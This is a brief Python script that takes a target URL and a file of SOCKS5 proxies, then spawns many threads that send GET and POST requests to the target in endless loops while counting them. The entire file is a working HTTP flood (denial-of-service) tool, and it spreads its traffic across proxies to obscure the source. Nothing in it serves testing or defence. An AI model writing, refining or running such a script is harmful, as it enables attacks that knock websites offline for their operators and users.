import threading
import time
import requests

url = input('URL: ')
proxy_file = input('PROXY FILE NAME: ')

with open(proxy_file, 'r') as file:
    proxy_base = file.readlines()

x = 0

def checks(i, url):
    global x
    while True:
        try:
            proxies = {
                'http': f'socks5://{i}',
                'https': f'socks5://{i}'
            }
            response = requests.get(url, proxies=proxies)
            requests.post(url, proxies=proxies)
            x += 2
            print(f'\r\rresponse: {response} {x}', end='')
        except:
            pass

for j in range(10):
    for i in proxy_base:
        threading.Thread(target=checks, args=(i, url,)).start()